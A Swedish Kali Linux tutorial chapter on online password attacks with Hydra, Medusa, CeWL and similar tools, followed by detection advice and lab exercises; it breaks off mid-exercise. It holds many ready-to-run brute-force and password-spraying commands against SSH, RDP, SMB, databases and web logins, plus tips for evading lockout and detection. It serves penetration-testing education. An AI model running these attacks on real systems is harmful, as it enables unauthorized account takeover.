# 🌐 Nivå 4C Del 2: Password Attacks - Online Attacks & Wordlist Generation

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md) | [⬅️ Nivå 4C Del 1: Offline Cracking](niva-4c-password-attacks-pt1.md)

---

## 🔴 KRITISK JURIDISK VARNING

```
⚖️  OBEHÖRIGA ONLINE LÖSENORDSATTACKER ÄR OLAGLIGT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ FÖRBJUDET:
   • Brute-force attacker mot system du INTE äger
   • Testa lösenord mot tjänster utan SKRIFTLIGT tillstånd
   • Attackera produktionssystem
   • Denial of Service (DoS) genom aggressiva attacker
   • Kringgå account lockout-mekanismer

✅ TILLÅTET (med explicit tillstånd):
   • Egna servrar och tjänster du äger
   • Penetrationstestning med SKRIFTLIGT kontrakt
   • CTF-tävlingar och säkerhetslabbar
   • Educational labs (DVWA, Metasploitable, HackTheBox)
   • Security audits med klientens godkännande

🇸🇪 SVENSK LAG:
   Brottsbalken 4 kap. 9c § - Dataintrång
   → Upp till 2 års fängelse
   → Även misslyckade försök är brottsliga

🌍 INTERNATIONELLT:
   • USA: CFAA - upp till 10 år + böter
   • EU: GDPR-böter + straffrättsliga påföljder
   • UK: Computer Misuse Act - upp till 10 år

⚠️  EXTRA RISK VID ONLINE ATTACKER:
   • Alla försök LOGGAS av målsystemet
   • IP-adresser och timestamps registreras
   • Kan leda till IP-blockering och rapportering
   • Kan klassas som DoS-attack vid höga hastigheter
```

**🛑 ANSVARSFRISKRIVNING:**
Författaren tar INGET ansvar för missbruk av denna information. DU är PERSONLIGT ansvarig för dina handlingar.

---

## 📚 Innehållsförteckning

1. [Introduktion till Online Password Attacks](#introduktion)
2. [THC Hydra](#hydra)
3. [Medusa](#medusa)
4. [CeWL - Custom Wordlist Generator](#cewl)
5. [Ncrack och Andra Verktyg](#andra-verktyg)
6. [Detektering och Motåtgärder](#detektering)
7. [Praktiska Övningar](#praktiska-övningar)
8. [Självtest](#självtest)
9. [Sammanfattning](#sammanfattning)

---

## 🎯 Introduktion till Online Password Attacks {#introduktion}

### Vad är Online Password Attacks?

**Online password attacks** testar lösenord direkt mot levande tjänster över nätverket, till skillnad från offline attacks som arbetar med hash-filer lokalt.

### Offline vs Online - Djupare Jämförelse

| Aspekt | Offline (Del 1) | Online (Del 2) |
|--------|-----------------|----------------|
| **Måltyp** | Hash-filer, databaser | SSH, FTP, HTTP, RDP, SMB |
| **Hastighet** | Miljontals/sekund (GPU) | 10-1000/sekund (nätverksbegränsad) |
| **Detekterbarhet** | Ingen (lokalt arbete) | ⚠️ HÖG - Loggas alltid |
| **Begränsningar** | Behöver hash-fil först | Rate limiting, account lockout |
| **Ljud** | Tyst | 🚨 Högt (genererar trafik, loggar, alarms) |
| **Verktyg** | John, Hashcat | Hydra, Medusa, Ncrack |
| **Riskfaktor** | Låg (vid legal hash) | ⚠️ HÖG (spårbart, kan vara DoS) |

### Vanliga Målprotokoll

```
┌──────────────────────────────────────────────────┐
│  PROTOKOLL SOM KAN ATTACKERAS ONLINE             │
└──────────────────────────────────────────────────┘

🔐 REMOTE ACCESS
   ├─ SSH (Port 22)         - Linux/Unix servers
   ├─ Telnet (Port 23)      - Legacy unencrypted
   ├─ RDP (Port 3389)       - Windows Remote Desktop
   └─ VNC (Port 5900)       - Virtual Network Computing

📁 FILE TRANSFER
   ├─ FTP (Port 21)         - File Transfer Protocol
   ├─ SFTP (Port 22)        - Secure FTP over SSH
   └─ SMB (Port 445)        - Windows file sharing

🌐 WEB SERVICES
   ├─ HTTP Basic Auth       - Web server authentication
   ├─ HTTP Form Login       - Web application login
   ├─ HTTP Digest Auth      - MD5-based auth
   └─ HTTPS (443)           - Encrypted web services

📧 EMAIL
   ├─ POP3 (Port 110)       - Email retrieval
   ├─ IMAP (Port 143)       - Email access
   └─ SMTP (Port 25)        - Email sending

💾 DATABASES
   ├─ MySQL (Port 3306)     - MySQL database
   ├─ PostgreSQL (5432)     - PostgreSQL database
   ├─ MSSQL (Port 1433)     - Microsoft SQL Server
   └─ MongoDB (27017)       - NoSQL database
```

### Attack-strategier

#### 1️⃣ Brute Force Attack

**Testar alla möjliga kombinationer:**

```
Fördelar:
✅ Garanterat lyckas (givet tillräcklig tid)
✅ Ingen ordlista behövs

Nackdelar:
❌ EXTREMT långsamt över nätverk
❌ Lätt att detektera
❌ Ofta blockeras av account lockout
```

**Exempel:**
- 4-siffrig PIN: 10,000 kombinationer → ~1 timme vid 3 försök/sekund
- 6 tecken lowercase: 308 miljoner → FLERA ÅR över nätverk

#### 2️⃣ Dictionary Attack

**Testar lösenord från ordlista:**

```
Fördelar:
✅ Mycket snabbare än brute force
✅ Täcker vanliga lösenord effektivt
✅ Kan kombineras med regler

Nackdelar:
❌ Begränsad till ordlistans innehåll
❌ Missar unika/komplexa lösenord
```

**Bästa ordlistor:**
- rockyou.txt (14M vanliga lösenord)
- fasttrack.txt (222 default-lösenord)
- CeWL-genererade (målanpassade)

#### 3️⃣ Credential Stuffing

**Använder läckta credentials från databaser:**

```
Fördelar:
✅ Hög träffprocent (användare återanvänder lösenord)
✅ Testar endast realistiska kombinationer

Nackdelar:
❌ Kräver tillgång till läckta databaser
❌ Etiskt problematiskt (använder stulna credentials)
```

**🔴 VARNING:** Användning av läckta credentials från verkliga databaser är OLAGLIGT utan explicit tillstånd.

### Rate Limiting och Account Lockout

De flesta moderna system har skydd:

| Skyddstyp | Beskrivning | Förbikoppling |
|-----------|-------------|---------------|
| **Account Lockout** | Konto låses efter X misslyckade försök | Testa många användare med få lösenord |
| **Rate Limiting** | Begränsar försök/sekund från IP | Distribuerade attacker, proxies |
| **CAPTCHA** | Kräver mänsklig verifiering | Svårt/omöjligt att förbigå automatiskt |
| **IP Blocking** | Blockerar IP efter X försök | Rotera IP-adresser (proxies/VPN) |
| **Delay** | Tvingad fördröjning mellan försök | Inget att göra - acceptera långsammare attack |

**🟢 TIP:** Vid penetrationstestning, använd **låga hastigheter** (1-3 försök/sekund) för att undvika lockout.

---

## 🌊 THC Hydra {#hydra}

### Översikt

**Hydra** (THC Hydra) är det mest populära och mångsidiga verktyget för online password cracking.

| Egenskap | Detalj |
|----------|--------|
| **Utvecklare** | The Hacker's Choice (THC) |
| **Licens** | AGPL v3.0 (open source) |
| **Protokoll** | 50+ (SSH, FTP, HTTP, RDP, SMB, SMTP, etc.) |
| **Parallellisering** | Ja (multi-threaded) |
| **GUI** | Hydra-GTK (grafiskt gränssnitt) |
| **Plattformar** | Linux, Windows, macOS |

### Installation

```bash
# Hydra är förinstallerat i Kali Linux
hydra -h

# Version
hydra -V
# Output: Hydra v9.5

# Lista alla stödda protokoll
hydra -h | grep "Supported services"
# Output: adam6500, asterisk, cisco, cisco-enable, cvs, firebird, ftp,
#         http[s]-{get|post|head}, imap, ldap, mysql, oracle, postgres,
#         rdp, redis, smb, smtp, ssh, telnet, vnc, xmpp, ...
```

### Grundläggande Syntax

```bash
hydra [options] <target> <protocol>
```

**Viktiga parametrar:**

| Parameter | Beskrivning |
|-----------|-------------|
| `-l <user>` | Ange ett användarnamn |
| `-L <file>` | Användarnamns-lista (fil) |
| `-p <pass>` | Ange ett lösenord |
| `-P <file>` | Lösenords-lista (fil) |
| `-t <threads>` | Antal parallella connections (default: 16) |
| `-w <sec>` | Timeout per connection (default: 30) |
| `-f` | Stoppa när första valid credential hittas |
| `-v / -V` | Verbose output (visa försök) |
| `-o <file>` | Output-fil för resultat |
| `-s <port>` | Custom port (om ej standard) |

### Exempel: SSH Brute Force

#### Single User, Password List

```bash
# Attack mot SSH med användarnamn "admin" och rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Med verbose output
hydra -l admin -P rockyou.txt -V ssh://192.168.1.100

# Stoppa vid första träff
hydra -l admin -P rockyou.txt -f ssh://192.168.1.100

# Använd endast 4 threads (mindre aggressivt)
hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.100
```

#### User List, Password List

```bash
# Skapa användarnamns-lista
cat > users.txt << EOF
admin
root
user
backup
test
EOF

# Attack med båda listor
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ssh://192.168.1.100

# Spara resultat till fil
hydra -L users.txt -P fasttrack.txt -o ssh_results.txt ssh://192.168.1.100
```

**Output exempel:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks
[DATA] attacking ssh://192.168.1.100:22/
[22][ssh] host: 192.168.1.100   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### Protokoll-specifika Exempel

#### FTP

```bash
# Standard FTP (port 21)
hydra -l ftp -P rockyou.txt ftp://192.168.1.100

# Custom port
hydra -l admin -P passwords.txt -s 2121 ftp://192.168.1.100

# Med verbose
hydra -l anonymous -P /usr/share/wordlists/fasttrack.txt -V ftp://target.com
```

#### HTTP Basic Auth

```bash
# HTTP Basic Authentication
hydra -l admin -P rockyou.txt http://192.168.1.100/admin

# HTTPS
hydra -l admin -P passwords.txt https://example.com/admin

# Custom port
hydra -l admin -P passwords.txt -s 8080 http://192.168.1.100
```

#### HTTP Form-Based Login

**Detta är mer komplext och kräver analys av login-formuläret:**

```bash
# Syntax:
# http-post-form "path:postdata:failstring"

# Exempel: WordPress login
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

# DVWA login
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"

# Med cookie (om krävs)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect:H=Cookie: security=low; PHPSESSID=abc123"
```

**Förklaring:**
- `^USER^` = Platshållare för användarnamn
- `^PASS^` = Platshållare för lösenord
- `F=` = Fail string (text som visas vid misslyckad inloggning)
- `S=` = Success string (alternativ - text vid lyckad inloggning)
- `H=` = Custom headers (cookies, user-agent, etc.)

**🟢 TIP:** Använd webbläsarens Developer Tools (F12) för att se exakt POST-data vid inloggning.

#### RDP (Windows Remote Desktop)

```bash
# RDP attack (port 3389)
hydra -l Administrator -P passwords.txt rdp://192.168.1.100

# Med specifik domain
hydra -l "DOMAIN\admin" -P rockyou.txt rdp://192.168.1.100

# Flera threads (RDP tolererar högre parallelism)
hydra -l admin -P passwords.txt -t 4 rdp://192.168.1.100
```

**⚠️ VARNING:** RDP account lockout är vanligt - använd låg thread count (1-4).

#### SMB (Windows File Sharing)

```bash
# SMB attack (port 445)
hydra -l Administrator -P passwords.txt smb://192.168.1.100

# Med domain
hydra -l "WORKGROUP\admin" -P rockyou.txt smb://192.168.1.100

# Output till fil
hydra -l admin -P passwords.txt -o smb_creds.txt smb://192.168.1.100
```

#### MySQL Database

```bash
# MySQL attack (port 3306)
hydra -l root -P passwords.txt mysql://192.168.1.100

# Custom port
hydra -l dbadmin -P rockyou.txt -s 3307 mysql://192.168.1.100
```

#### PostgreSQL

```bash
# PostgreSQL attack (port 5432)
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# Med database-namn
hydra -l postgres -P passwords.txt postgres://192.168.1.100/mydb
```

#### SMTP (Email)

```bash
# SMTP attack (port 25)
hydra -l user@example.com -P passwords.txt smtp://192.168.1.100

# SMTP med STARTTLS (port 587)
hydra -l user@domain.com -P rockyou.txt -s 587 smtp://mail.example.com
```

### Avancerade Tekniker

#### Password Spraying

**Testar FÅ lösenord mot MÅNGA användare (undviker account lockout):**

```bash
# Skapa användarlista (många användare)
cat > users.txt << EOF
admin
user1
user2
...
user100
EOF

# Skapa kort lösenordslista (vanliga default)
cat > common_passwords.txt << EOF
Password123
Welcome1
Summer2024
Company2024
EOF

# Password spray (1-2 threads för att vara försiktig)
hydra -L users.txt -P common_passwords.txt -t 1 -f ssh://192.168.1.100
```

**🟢 BÄSTA PRAXIS:**
- Testa max 3-5 lösenord per användare
- Vänta 30+ minuter mellan "rundor"
- Undviker account lockout (ofta 5 försök/30 min)

#### Resume Funktionalitet

```bash
# Hydra skapar automatiskt .restore-fil vid avbrott
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# Avbryt med Ctrl+C, sedan återuppta:
hydra -R
```

#### Custom User-Agent (HTTP)

```bash
# Ändra User-Agent för att undvika detektering
hydra -l admin -P passwords.txt \
  -m "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  http-get://192.168.1.100/admin
```

#### Proxy Support

```bash
# Använd SOCKS5 proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP proxy
export HYDRA_PROXY_HTTP=http://proxy.example.com:8080
hydra -l admin -P passwords.txt http://target.com
```

### Hydra-GTK (Grafiskt Gränssnitt)

```bash
# Starta grafiskt gränssnitt
hydra-gtk

# Eller via xhydra (alias)
xhydra
```

**GUI-funktioner:**
- Point-and-click konfiguration
- Visualisering av attack-progress
- Lättare för nybörjare
- Samma funktionalitet som CLI

---

## 🐙 Medusa {#medusa}

### Översikt

**Medusa** är en snabb, parallel och modular login brute-forcer som alternativ till Hydra.

| Egenskap | Detalj |
|----------|--------|
| **Utvecklare** | jmk (foofus.net) |
| **Licens** | GPL v2 (open source) |
| **Protokoll** | 20+ moduler (SSH, FTP, HTTP, SMB, etc.) |
| **Parallellisering** | Extremt effektiv (ofta snabbare än Hydra) |
| **Fokus** | Hastighet och stabilitet |

### Installation

```bash
# Medusa är förinstallerat i Kali Linux
medusa -h

# Version
medusa -V
# Output: Medusa v2.2

# Lista alla tillgängliga moduler
medusa -d
# Output: Available modules:
#   + mssql.mod : Brute force module for MS-SQL sessions : v2.0
#   + mysql.mod : Brute force module for MySQL sessions : v2.0
#   + ssh.mod : Brute force module for SSH v2 sessions : v2.1
#   ...
```

### Grundläggande Syntax

```bash
medusa [options] -h <host> -u <user> -p <password> -M <module>
```

**Viktiga parametrar:**

| Parameter | Beskrivning |
|-----------|-------------|
| `-h <host>` | Target host/IP |
| `-H <file>` | Host-lista (fil) |
| `-u <user>` | Användarnamn |
| `-U <file>` | Användarnamns-lista |
| `-p <pass>` | Lösenord |
| `-P <file>` | Lösenords-lista |
| `-M <module>` | Modul (ssh, ftp, http, etc.) |
| `-t <threads>` | Antal threads (default: 4) |
| `-T <hosts>` | Parallella hosts (default: 1) |
| `-f` | Stoppa vid första valid credential |
| `-O <file>` | Output-fil |
| `-v <level>` | Verbosity (0-6) |

### Exempel: SSH Brute Force

```bash
# Single user, single password
medusa -h 192.168.1.100 -u admin -p password123 -M ssh

# Single user, password list
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# User list, password list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Med threads och verbose output
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh -t 8 -v 4

# Stoppa vid första träff
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh -f
```

**Output exempel:**

```
Medusa v2.2 [http://www.foofus.net]
ACCOUNT CHECK: [ssh] Host: 192.168.1.100 (1 of 1) User: admin (1 of 1) Password: password123 (1 of 3344391)
ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: password123 [SUCCESS]
```

### Protokoll-specifika Exempel

#### FTP

```bash
# Standard FTP
medusa -h 192.168.1.100 -u ftp -P passwords.txt -M ftp

# Custom port
medusa -h 192.168.1.100 -n 2121 -u admin -P rockyou.txt -M ftp

# Spara resultat
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -O ftp_results.txt
```

#### HTTP Basic Auth

```bash
# HTTP Basic Authentication
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# HTTPS
medusa -h example.com -u admin -P rockyou.txt -M http -m DIR:/admin -n 443

# Med verbose output
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/secure -v 4
```

**Modul-optioner för HTTP:**
- `-m DIR:/path` = Path till skyddad resurs
- `-m USER-AGENT:string` = Custom User-Agent

#### SMB/CIFS (Windows)

```bash
# SMB attack
medusa -h 192.168.1.100 -u Administrator -P passwords.txt -M smbnt

# Med domain
medusa -h 192.168.1.100 -u "DOMAIN\admin" -P rockyou.txt -M smbnt

# Windows share
medusa -h 192.168.1.100 -u admin -P passwords.txt -M smbnt -m GROUP:WORKGROUP
```

#### RDP

```bash
# RDP attack (kräver rdp.mod)
medusa -h 192.168.1.100 -u Administrator -P passwords.txt -M rdp

# Låg thread count (undvik lockout)
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp -t 2
```

#### MySQL

```bash
# MySQL attack
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# Custom port
medusa -h 192.168.1.100 -n 3307 -u dbadmin -P rockyou.txt -M mysql
```

#### PostgreSQL

```bash
# PostgreSQL attack
medusa -h 192.168.1.100 -u postgres -P passwords.txt -M postgres

# Med database
medusa -h 192.168.1.100 -u postgres -P passwords.txt -M postgres -m DATABASE:mydb
```

### Avancerade Funktioner

#### Parallella Hosts

```bash
# Skapa host-lista
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF

# Attack mot alla hosts samtidigt
medusa -H targets.txt -u admin -P passwords.txt -M ssh -T 3

# -T 3 = Attackera 3 hosts parallellt
```

#### Kombination av Filer

```bash
# Combo-fil format: host:user:password
cat > combo.txt << EOF
192.168.1.100:admin:password123
192.168.1.101:root:toor
192.168.1.102:user:welcome
EOF

# Använd combo-fil
medusa -C combo.txt -M ssh
```

#### Resume Funktionalitet

```bash
# Medusa skapar .resume-fil automatiskt
medusa -h 192.168.1.100 -U users.txt -P rockyou.txt -M ssh -Z h1.txt

# Återuppta efter avbrott
medusa -Z h1.txt.resume
```

### Hydra vs Medusa - Jämförelse

| Aspekt | Hydra | Medusa |
|--------|-------|--------|
| **Protokoll** | 50+ | 20+ |
| **Hastighet** | Snabb | Ofta snabbare (bättre threading) |
| **Stabilitet** | Bra | Mycket bra |
| **Användarvänlighet** | Enklare syntax | Mer komplex syntax |
| **GUI** | Ja (Hydra-GTK) | Nej |
| **HTTP Form** | Utmärkt stöd | Begränsat |
| **Parallelism** | Bra | Excellent |
| **Populäritet** | Mycket hög | Måttlig |

**🟢 REKOMMENDATION:**
- Använd **Hydra** för HTTP form-based attacks och bred protokoll-support
- Använd **Medusa** för SSH/FTP/SMB när maximal hastighet krävs

---

## 📝 CeWL - Custom Wordlist Generator {#cewl}

### Översikt

**CeWL** (Custom Word List generator) skapar ordlistor genom att crawla webbplatser och extrahera ord.

| Egenskap | Detalj |
|----------|--------|
| **Utvecklare** | Robin Wood (@digininja) |
| **Licens** | Creative Commons (open source) |
| **Språk** | Ruby |
| **Användning** | Generera målanpassade wordlists |
| **Styrka** | Hitta företagsspecifika termer, produktnamn, etc. |

**🎯 VARFÖR CEWL?**

Människor använder ofta ord relaterade till sitt företag, produkt eller intresse som lösenord:
- Företag "TechCorp" → TechCorp2024, techcorp!, TechCorp123
- Produkt "Phoenix" → Phoenix2024, phoenix!, Phoenix@123

### Installation

```bash
# CeWL är förinstallerat i Kali Linux
cewl -h

# Version
cewl --version
# Output: CeWL 6.1
```

### Grundläggande Användning

```bash
# Enklaste användning
cewl http://example.com

# Spara till fil
cewl http://example.com -w wordlist.txt

# Custom djup (hur många klick följs)
cewl -d 2 http://example.com -w wordlist.txt
# -d 2 = Följ länkar 2 nivåer djupt

# Minimum ord-längd (standard: 3)
cewl -m 6 http://example.com -w wordlist.txt
# -m 6 = Endast ord med minst 6 tecken
```

### Viktiga Parametrar

| Parameter | Beskrivning |
|-----------|-------------|
| `-d <depth>` | Spider depth (hur många nivåer, default: 2) |
| `-m <length>` | Minimum ord-längd (default: 3) |
| `-w <file>` | Output wordlist-fil |
| `--with-numbers` | Inkludera ord med siffror |
| `-e / --email` | Extrahera email-adresser |
| `-a / --meta` | Inkludera metadata från dokument |
| `--meta_file <file>` | Spara metadata separat |
| `-v / --verbose` | Verbose output |
| `-c` | Visa ord-count |
| `--lowercase` | Konvertera allt till gemener |

### Praktiska Exempel

#### Exempel 1: Grundläggande Wordlist

```bash
# Generera wordlist från företagets hemsida
cewl -d 3 -m 6 -w company_words.txt https://example.com

# Visa antal unika ord
wc -l company_words.txt
# Output: 1247 company_words.txt

# Visa top 20 längsta ord
sort -u company_words.txt | awk '{print length, $0}' | sort -nr | head -20
```

#### Exempel 2: Email Harvesting

```bash
# Extrahera emails från webbplats
cewl -e https://example.com

# Spara emails till fil
cewl -e --email_file emails.txt https://example.com

# Kombinera wordlist + emails
cewl -d 2 -m 5 -w words.txt -e --email_file emails.txt https://example.com
```

**Output exempel (emails.txt):**
```
john.doe@example.com
info@example.com
support@example.com
sales@example.com
```

**🟢 TIP:** Använd emails som användarnamn i Hydra:
```bash
hydra -L emails.txt -P words.txt ssh://192.168.1.100
```

#### Exempel 3: Inkludera Metadata från Dokument

```bash
# Extrahera ord från PDF/DOC metadata
cewl -a -d 2 -w words_with_meta.txt https://example.com

# Spara metadata separat
cewl -a --meta_file metadata.txt -w words.txt https://example.com
```

**Metadata kan innehålla:**
- Författarnamn
- Företagsnamn
- Dokument-titlar
- Software-versioner

#### Exempel 4: Crawla Med Autentisering

```bash
# Om webbplatsen kräver Basic Auth
cewl -d 2 -w words.txt --auth_type basic --auth_user admin --auth_pass password123 https://example.com/members

# Om cookies behövs (från webbläsare)
cewl -d 2 -w words.txt --header "Cookie: session=abc123" https://example.com
```

#### Exempel 5: Custom User-Agent

```bash
# Ändra User-Agent (vissa sidor blockerar bots)
cewl -d 2 -w words.txt -u "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com
```

### Kombinera CeWL med John the Ripper

```bash
# 1. Generera wordlist från målföretag
cewl -d 3 -m 6 -w base_words.txt https://targetcompany.com

# 2. Applicera John-regler för att skapa variationer
john --wordlist=base_words.txt --rules --stdout > enhanced_wordlist.txt

# 3. Använd med Hydra
hydra -l admin -P enhanced_wordlist.txt ssh://192.168.1.100
```

**Resultat:**
- `TechCorp` → TechCorp, techcorp, TECHCORP, TechCorp123, TechCorp2024, T3chC0rp, ...

### Kombinera CeWL med Hashcat Rules

```bash
# 1. Generera base wordlist
cewl -d 2 -m 5 --lowercase -w base.txt https://example.com

# 2. Använd med Hashcat + regler
hashcat -m 0 -a 0 hashes.txt base.txt -r /usr/share/hashcat/rules/best64.rule
```

### CeWL + Crunch för Hybrid

```bash
# 1. Hitta vanliga ord från webbplats
cewl -d 2 -m 4 https://example.com | head -10 > top_words.txt

# 2. Kombinera med crunch för siffror
while read word; do
    crunch 4 4 -t ${word}%%%% >> hybrid_wordlist.txt
done < top_words.txt

# Resultat:
# phoenix0000, phoenix0001, ..., phoenix9999
# security0000, security0001, ..., security9999
```

---

## 🛠️ Ncrack och Andra Verktyg {#andra-verktyg}

### Ncrack

**Ncrack** är ett högpresterande network authentication cracking-verktyg från Nmap-projektet.

```bash
# Installation
sudo apt install ncrack

# Grundläggande SSH attack
ncrack -p 22 -u admin -P rockyou.txt 192.168.1.100

# RDP attack
ncrack -p 3389 -u Administrator -P passwords.txt 192.168.1.100

# Flera services samtidigt
ncrack -p ssh:22,ftp:21 -u admin -P passwords.txt 192.168.1.0/24
```

**Fördelar:**
- Från Nmap-teamet (pålitlig)
- Utmärkt timing och retry-logik
- Bra för Windows-protokoll (RDP, SMB)

### Patator

**Patator** är en modulär brute-force tool skriven i Python.

```bash
# Installation
sudo apt install patator

# SSH attack
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt

# HTTP Form
patator http_fuzz url=http://192.168.1.100/login.php method=POST \
  body='username=admin&password=FILE0' 0=passwords.txt \
  -x ignore:fgrep='Login failed'
```

**Fördelar:**
- Mycket flexibel (Python-baserad)
- Bra för komplexa HTTP-attacker
- Aktiv utveckling

### Crowbar

**Crowbar** är specialiserad för protokoll som kräver nyckelbaserad auth (SSH keys, RDP).

```bash
# Installation
sudo apt install crowbar

# SSH med privata nycklar
crowbar -b sshkey -s 192.168.1.100/32 -u admin -k /path/to/keys/

# RDP attack
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt
```

---

## 🚨 Detektering och Motåtgärder {#detektering}

### Hur Admins Detekterar Brute Force

#### 1️⃣ Log Analysis

**Alla online attacker loggas:**

```bash
# Linux SSH logs
sudo tail -f /var/log/auth.log | grep "Failed password"
# Output:
# Failed password for admin from 192.168.1.50 port 52341 ssh2
# Failed password for admin from 192.168.1.50 port 52342 ssh2
# Failed password for admin from 192.168.1.50 port 52343 ssh2
```

**Windows Event Logs:**
- Event ID 4625 (Failed login)
- Event ID 4740 (Account lockout)

#### 2️⃣ IDS/IPS Alerts

**Intrusion Detection Systems** detekterar mönster:

```
ALERT: Multiple authentication failures from 192.168.1.50
       Protocol: SSH (22/tcp)
       Attempts: 143 in last 5 minutes
       Action: IP blocked for 1 hour
```

**Populära IDS:**
- Snort
- Suricata
- OSSEC
- Fail2Ban

#### 3️⃣ SIEM Korrelation

**Security Information and Event Management** systems korrelerar händelser:

```
Pattern Detected: Distributed Brute Force Attack
  - Source IPs: 15 unique addresses
  - Target: ssh://web-server-01
  - Timeframe: 2024-01-15 10:00-10:30
  - Total attempts: 2,431
  - Recommendation: Enable geographic IP filtering
```

### Motåtgärder

#### För Defendrar

| Motåtgärd | Beskrivning | Effektivitet |
|-----------|-------------|--------------|
| **Account Lockout** | Lås konto efter X försök | ⭐⭐⭐⭐ |
| **Rate Limiting** | Max försök/minut från IP | ⭐⭐⭐⭐ |
| **Fail2Ban** | Auto-blockera IP efter mönster | ⭐⭐⭐⭐⭐ |
| **2FA/MFA** | Kräv andra faktor | ⭐⭐⭐⭐⭐ |
| **Strong Passwords** | Enforce komplex policy | ⭐⭐⭐⭐ |
| **Geo-blocking** | Blockera länder | ⭐⭐⭐ |
| **CAPTCHA** | Mänsklig verifiering | ⭐⭐⭐⭐ |
| **Honeypot Accounts** | Lockbete-konton | ⭐⭐⭐ |

#### Fail2Ban Exempel (Linux)

```bash
# Installera Fail2Ban
sudo apt install fail2ban

# Konfigurera SSH-skydd
sudo nano /etc/fail2ban/jail.local

# Lägg till:
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# Starta Fail2Ban
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

# Kontrollera status
sudo fail2ban-client status sshd
```

**Resultat:** Efter 3 misslyckade försök inom 10 minuter → IP blockeras i 1 timme.

#### För Penetrationstestare

**Så här UNDVIKER du detektering (vid laglig pentesting):**

```bash
# 1. Låg hastighet (1-2 försök per sekund)
hydra -l admin -P passwords.txt -t 2 -w 10 ssh://192.168.1.100

# 2. Password Spraying (många användare, få lösenord)
hydra -L users.txt -p "Password123" -t 1 ssh://192.168.1.100

# 3. Vänta mellan rundor
hydra -L users.txt -p "Welcome1" ssh://192.168.1.100
sleep 1800  # Vänta 30 minuter
hydra -L users.txt -p "Summer2024" ssh://192.168.1.100

# 4. Rotera IP-adresser (om tillåtet i engagement)
# Använd proxychains eller VPN
```

**🟡 VIKTIGT:** Koordinera alltid med klienten angående acceptabla attack-hastigheter och metoder.

---

## 🧪 Praktiska Övningar {#praktiska-övningar}

### 🔬 Övning 1: SSH Brute Force med Hydra

**Scenario:** Du testar SSH-säkerhet på din egen Kali VM.

```bash
# 1. Skapa test-användare på Kali
sudo useradd -m testuser
echo "testuser:summer2024" | sudo chpasswd

# 2. Skapa minimal wordlist
cat > test_passwords.txt << EOF
password
admin
123456
summer2024
winter2023
EOF

# 3. Attack med Hydra
hydra -l testuser -P test_passwords.txt ssh://localhost

# 4. Verifiera resultat
# Förväntat: "summer2024" hittas
```

**✅ Förväntat resultat:** Hydra hittar "summer2024".

---

### 🔬 Övning 2: FTP Brute Force med Medusa

**Scenario:** Testa FTP-server på Metasploitable.

```bash
# 1. Starta Metasploitable VM (om tillgänglig)

# 2. Skapa wordlist med vanliga FTP-lösenord
cat > ftp_passwords.txt << EOF
ftp
anonymous
admin
root
user
EOF

# 3. Attack med Medusa
medusa -h 192.168.56.101 -u ftp -P ftp_passwords.txt -M ftp -v 4

# 4. Försök logga in med hittade credentials
ftp 192.168.56.101
```

---

### 🔬 Övning 3: CeWL Wordlist Generation

**Scenario:** Generera custom wordlist från företagshemsida.

```bash
# 1. Välj målwebbplats (använd legal testsite)
cewl -d 2 -m 6 -w example_words.txt http://testphp.vulnweb.com/

# 2. Visa statistik
echo "Total words: $(wc -l < example_words.txt)"
echo "Top 10 longest words:"
sort -u example_words.txt | awk '{print length, $0}' | sort -nr | head -10

# 3. Kombinera med John-regler
john --wordlist=example_words.txt --rules --stdout > enhanced.txt

# 4. Jämför storlek
wc -l example_words.txt enhanced.txt
```

---

### 🔬 Övning 4: HTTP Form Attack med Hydra

**Scenario:** Attack mot DVWA login (i Metasploitable eller lokal DVWA).

```bash
# 1. Identifiera login-form (använd Developer Tools i webbläsare)
# POST till: /dvwa/login.php
# Data: username=admin&password=test&Login=Login
# Fail string: "Login failed"

# 2. Hämta PHPSESSID cookie
curl -c cookies.txt http://192.168.56.101/dvwa/
SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}')

# 3. Attack med Hydra
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 \
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie: security=low; PHPSESSID=$SESSION"

# 4. Testa hittade credentials i webbläsare
```

---

### 🔬 Övning 5: Password Spraying

**Scenario:** Undvik account lockout genom password spraying.

```bash
